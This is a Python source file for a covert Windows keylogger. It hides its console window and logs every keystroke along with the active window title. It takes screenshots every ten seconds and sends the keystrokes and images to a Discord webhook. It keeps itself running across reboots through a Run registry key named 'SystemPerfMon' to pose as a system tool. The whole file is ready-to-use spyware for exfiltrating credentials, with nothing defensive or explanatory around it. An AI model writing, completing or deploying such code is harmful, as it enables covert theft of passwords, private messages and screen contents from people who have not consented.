import os
import sys
import threading
import time
import requests
import json
import tempfile
from pynput import keyboard
import winreg as reg
import ctypes
from PIL import ImageGrab
import win32gui

# --- Configuration ---
WEBHOOK_URL = "" # Replace with your webhook
SHORT_SEND_INTERVAL = 10 # Send recent keys & screenshot every 10 seconds (as per your example)
LONG_SEND_INTERVAL = 60 # Send consolidated log every 600 seconds (10 minutes)
MAX_SHORT_LOG_LENGTH = 1800 # Max characters for short interval description
MAX_LONG_LOG_LENGTH = 1950 # Max characters for long interval description (Discord limit is 2048, leave some room)
# --- End Configuration ---

# --- Globals ---
key_buffer = "" # For short interval logs
long_term_key_buffer = "" # For long interval consolidated logs
last_window_title = None
screenshot_path = None

# Color Constants for Embeds
COLOR_BLUE = 0x3498DB
COLOR_RED = 0xFF0000
COLOR_PURPLE = 0x9B59B6 # For long term log

# --- Hide Console Window ---
try:
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0:
        ctypes.windll.user32.ShowWindow(hwnd, 0)
except Exception:
    pass

# --- Core Functions ---
def get_active_window_title():
    try:
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        return title if title else "Unknown Window"
    except Exception:
        return "Unknown Window (Error)"

def take_screenshot():
    global screenshot_path
    if screenshot_path and os.path.exists(screenshot_path):
        try: os.remove(screenshot_path)
        except OSError: pass
    screenshot_path = None

    try:
        fd, temp_path = tempfile.mkstemp(suffix=".png", prefix="ss_")
        os.close(fd)
        screenshot = ImageGrab.grab()
        screenshot.save(temp_path, "PNG")
        screenshot_path = temp_path
        return screenshot_path
    except Exception as e:
        # print(f"Screenshot error: {e}") # Debug
        if 'temp_path' in locals() and os.path.exists(temp_path):
             try: os.remove(temp_path)
             except OSError: pass
        screenshot_path = None
        return None

def format_key(key):
    """Formats key presses into a string representation."""
    try:
        return str(key.char)
    except AttributeError:
        key_name = str(key).split('.')[-1].upper()
        if key == key.space: return " "
        elif key == key.enter: return "[ENTER]\n"
        elif key == key.tab: return "[TAB]"
        elif key == key.backspace: return "[BckSp]"
        # Simplified common keys
        elif 'SHIFT' in key_name: return "[SHIFT]"
        elif 'CTRL' in key_name: return "[CTRL]"
        elif 'ALT' in key_name: return "[ALT]"
        elif key_name in ['DELETE', 'INSERT', 'HOME', 'END', 'PAGE_UP', 'PAGE_DOWN', 'CAPS_LOCK', 'PRINT_SCREEN', 'SCROLL_LOCK', 'PAUSE', 'MENU', 'CMD', 'WINDOWS', 'UP', 'DOWN', 'LEFT', 'RIGHT']:
             return f"[{key_name}]"
        else:
             return f"[{key_name}]" # Log other special keys if needed

def on_press(key):
    """Callback for key presses. Appends to both buffers."""
    global key_buffer
    global long_term_key_buffer
    global last_window_title

    current_window = get_active_window_title()
    formatted_key_str = format_key(key)

    # Add window change marker to long-term buffer if changed
    if current_window != last_window_title:
        long_term_key_buffer += f"\n\n[Window: {current_window}]\n"
        last_window_title = current_window

    # Append formatted key to both buffers
    key_buffer += formatted_key_str
    long_term_key_buffer += formatted_key_str


def send_short_interval_data():
    """Periodically sends recent keys, screenshot, and sets embed color."""
    global key_buffer
    global screenshot_path
    global WEBHOOK_URL
    global SHORT_SEND_INTERVAL
    global last_window_title # Read current window title

    while True:
        time.sleep(SHORT_SEND_INTERVAL)

        current_window = get_active_window_title() or "Unknown Window"
        temp_key_log = key_buffer # Copy buffer for this cycle
        embed_color = COLOR_RED # Default to Red (no new input)
        log_content_for_embed = ""

        if temp_key_log:
            embed_color = COLOR_BLUE # Change to Blue if there was input
            log_content_for_embed = f"```{temp_key_log[:MAX_SHORT_LOG_LENGTH]}```" + ("..." if len(temp_key_log) > MAX_SHORT_LOG_LENGTH else "")
        else:
            log_content_for_embed = "`[No new keystrokes in last interval]`"

        screenshot_file = take_screenshot() # Always attempt screenshot

        # --- Prepare Embed ---
        embed = {
            "title": "Real-time Activity Update",
            "description": log_content_for_embed,
            "color": embed_color,
            "fields": [
                {"name": "Active Window", "value": current_window, "inline": False}
            ],
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()) + "Z",
            "footer": {"text": f"Short Interval: {SHORT_SEND_INTERVAL}s"}
        }

        files = {}
        payload = {"embeds": [embed]}

        if screenshot_file:
            try:
                file_handle = open(screenshot_file, 'rb')
                screenshot_filename = os.path.basename(screenshot_file)
                embed["image"] = {"url": f"attachment://{screenshot_filename}"}
                files = {'file': (screenshot_filename, file_handle, 'image/png')}
                payload = {"embeds": [embed]}
                files['payload_json'] = (None, json.dumps(payload))
            except Exception as e:
                 # print(f"Short Interval: Error preparing screenshot: {e}") # Debug
                 if 'file' in files and files.get('file') and files['file'][1]: files['file'][1].close()
                 files = {'payload_json': (None, json.dumps({"embeds": [embed]}))}
                 if 'image' in embed: del embed['image']
                 screenshot_file = None
        else:
            files = {'payload_json': (None, json.dumps(payload))}

        # --- Send to Discord ---
        try:
            response = requests.post(WEBHOOK_URL, files=files)
            response.raise_for_status()
            # Success: Clear the short-term buffer
            key_buffer = ""
        except requests.exceptions.RequestException as e:
            # print(f"Short Interval: Network/Webhook Error: {e}") # Debug
            # Don't clear buffer on send failure
            pass
        except Exception as e:
            # print(f"Short Interval: Other error during send: {e}") # Debug
            pass
        finally:
            # --- Cleanup ---
            if 'file' in files and files.get('file') and files['file'][1]:
                files['file'][1].close()
            if screenshot_file and os.path.exists(screenshot_file):
                 try: os.remove(screenshot_file)
                 except OSError: pass
            screenshot_path = None # Reset global path


def send_long_term_data():
    """Periodically sends the consolidated log from the long-term buffer."""
    global long_term_key_buffer
    global WEBHOOK_URL
    global LONG_SEND_INTERVAL

    while True:
        time.sleep(LONG_SEND_INTERVAL)

        if not long_term_key_buffer: # Skip if nothing accumulated
            continue

        temp_long_log = long_term_key_buffer # Copy buffer for this cycle

        # --- Prepare Embed ---
        embed = {
            "title": "Consolidated Activity Log",
            "description": f"```{temp_long_log[:MAX_LONG_LOG_LENGTH]}```" + ("..." if len(temp_long_log) > MAX_LONG_LOG_LENGTH else ""),
            "color": COLOR_PURPLE, # Distinct color for consolidated log
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()) + "Z",
             "footer": {"text": f"Consolidated Log Interval: {LONG_SEND_INTERVAL}s"}
        }

        payload = json.dumps({"embeds": [embed]})
        headers = {'Content-Type': 'application/json'}

        # --- Send to Discord ---
        try:
            response = requests.post(WEBHOOK_URL, data=payload, headers=headers)
            response.raise_for_status()
            # Success: Clear the long-term buffer
            long_term_key_buffer = ""
        except requests.exceptions.RequestException as e:
            # print(f"Long Interval: Network/Webhook Error: {e}") # Debug
            # Don't clear buffer on send failure
            pass
        except Exception as e:
            # print(f"Long Interval: Other error during send: {e}") # Debug
            pass
        # No file cleanup needed here as we don't send files


def add_to_startup():
    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
        exe_path = sys.executable
    else:
        exe_path = os.path.abspath(__file__)
    exe_path_reg = f'"{exe_path}"'
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key_name = "SystemPerfMon" # Slightly different name

    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE)
        reg.SetValueEx(key, key_name, 0, reg.REG_SZ, exe_path_reg)
        reg.CloseKey(key)
    except OSError as e:
        # print(f"Failed to add to startup: {e}") # Debug
        pass

# --- Main Execution ---
if __name__ == "__main__":
    add_to_startup()

    # Initialize last window title
    last_window_title = get_active_window_title()
    # Add initial marker to long-term buffer
    long_term_key_buffer += f"[Session Start - Window: {last_window_title}]\n"


    # Start the short interval sending thread
    short_send_thread = threading.Thread(target=send_short_interval_data, daemon=True)
    short_send_thread.start()

    # Start the long interval sending thread
    long_send_thread = threading.Thread(target=send_long_term_data, daemon=True)
    long_send_thread.start()

    # Start the key listener (this will block the main thread)
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except Exception as e:
            # print(f"Listener error: {e}") # Debug
            pass